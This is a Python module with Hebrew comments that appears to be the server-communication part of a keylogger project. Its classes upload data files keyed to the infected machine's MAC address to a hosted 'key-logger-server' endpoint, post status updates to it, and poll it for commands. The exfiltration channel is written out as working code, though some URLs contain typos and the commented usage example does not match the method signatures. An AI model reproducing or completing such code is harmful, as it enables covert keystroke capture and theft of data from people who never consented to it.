from abc import ABC, abstractmethod
import requests
import json
import uuid

mac_address = ':'.join(f'{(uuid.getnode() >> i) & 0xff:02x}' for i in range(0, 48, 8))


class APIServer(ABC):
    """
    מחלקה אבסטרקטית לייצוג שרת API.
    כל מחלקה היורשת ממנה חייבת לממש את המתודה 'interact_with_server'.
    """

    @abstractmethod
    def interact_with_server(self, *args, **kwargs):
        pass


class StatusUpdater(APIServer):
    """
    שולח בקשת POST לעדכון סטטוס הפרויקט.
    """

    def interact_with_server(self, status_data):

        url = "https://key-logger-server.onrender.com/api/status/update"
        try:
            response = requests.post(url, json=status_data)
            response.raise_for_status()  # הרם שגיאה עבור קודי סטטוס שגיאה (4xx או 5xx)
            print(f"------------ הודעה נשלחה בהצלחה ----------------\n {status_data}")
            return response
        except requests.exceptions.RequestException as e:
            print(f"שגיאה בעדכון סטטוס: {e}")
            return None


class DataFileWriter(APIServer):
    """
    שולח בקשת POST לעדכון קובץ דאטא של מחשב ספציפי לפי כתובת MAC.
    """

    def interact_with_server(self, file_data, mac_address=mac_address):

        url = "https://key-logger-server.onrender.com/api/data/upload'"  # החלף בכתובת ה-URL האמיתית
        try:
            response = requests.post(url, json=file_data, headers={"mac_address": mac_address})
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException as e:
            print(f"שגיאה בעדכון קובץ דאטא עבור MAC {mac_address}: {e}")
            return None


class StatusChecker(APIServer):
    """
    שולח בקשת GET כדי לדעת האם יש שינויים בסטטוסים.
    """

    def interact_with_server(self):
        """
        שולח בקשת GET לבדיקת שינויים בסטטוסים.

        :return: תגובת השרת (requests.Response).
        """
        url = "https://key-logger-server.onrender.com/api/status/chec"  # החלף בכתובת ה-URL האמיתית
        try:
            response = requests.get(url)
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException as e:
            print(f"שגיאה בבדיקת שינויי סטטוס: {e}")
            return None


class RequestManager:
    """
    מנהל את הבקשות ומנתב אותן למחלקה המתאימה בהתאם למטודה וסוג הבקשה.
    """

    def __init__(self):
        self.status_updater = StatusUpdater()
        self.data_file_writer = DataFileWriter()
        self.status_checker = StatusChecker()

    def handle_request(self, method, request_type, kwargs = None):
        """
        מטפל בבקשה ומנתב אותה למחלקה המתאימה.

        :param method: שיטת הבקשה ('GET' או 'POST').
        :param request_type: סוג הבקשה ('status', 'data', 'dag').
        :param kwargs: ארגומנטים נוספים שיעברו למתודת 'interact_with_server'.
        :return: תגובת השרת או None במקרה של שגיאה.
        :raises ValueError: אם סוג בקשה לא חוקי.
        """
        if method.upper() == 'POST':
            if request_type == 'status':
                return self.status_updater.interact_with_server(kwargs)
            elif request_type == 'data':
                return self.data_file_writer.interact_with_server(kwargs)
            else:
                raise ValueError(f"סוג בקשה לא חוקי עבור POST: {request_type}")
        elif method.upper() == 'GET':
            if request_type == 'status':
                return self.status_checker.interact_with_server()

            else:
                raise ValueError(f"סוג בקשה לא חוקי עבור GET: {request_type}")
        else:
            raise ValueError(f"שיטת בקשה לא חוקית: {method}")

# # --- דוגמת שימוש ---
# if __name__ == "__main__":
#     request_manager = RequestManager()
#
#     # עדכון סטטוס
#     status_data = {"project_id": "123", "status": "running"}
#     status_response = request_manager.handle_request('POST', 'status', status_data=status_data)
#     if status_response:
#         print("עדכון סטטוס הצליח:", status_response.status_code)
#         print("תוכן התגובה:", status_response.json() if 'application/json' in status_response.headers.get('Content-Type', '') else status_response.text)
#
#     # עדכון קובץ דאטא
#     file_data = {"data_point_1": 10, "data_point_2": 20}
#     data_response = request_manager.handle_request('POST', 'data', mac_address="00:1A:2B:3C:4D:5E", file_data=file_data)
#     if data_response:
#         print("עדכון קובץ דאטא הצליח:", data_response.status_code)
#         print("תוכן התגובה:", data_response.json() if 'application/json' in data_response.headers.get('Content-Type', '') else data_response.text)
#
#     # בדיקת שינויי סטטוס
#     check_status_response = request_manager.handle_request('GET', 'status')
#     if check_status_response:
#         print("בדיקת שינויי סטטוס הצליחה:", check_status_response.status_code)
#         print("תוכן התגובה:", check_status_response.json() if 'application/json' in check_status_response.headers.get('Content-Type', '') else check_status_response.text)
#
#     # קבלת קובץ DAG
#     dag_file_response = request_manager.handle_request('GET', 'dag')
#     if dag_file_response:
#         print("קבלת קובץ DAG הצליחה:", dag_file_response.status_code)
#         print("תוכן קובץ DAG:", dag_file_response.json() if 'application/json' in dag_file_response.headers.get('Content-Type', '') else dag_file_response.text)
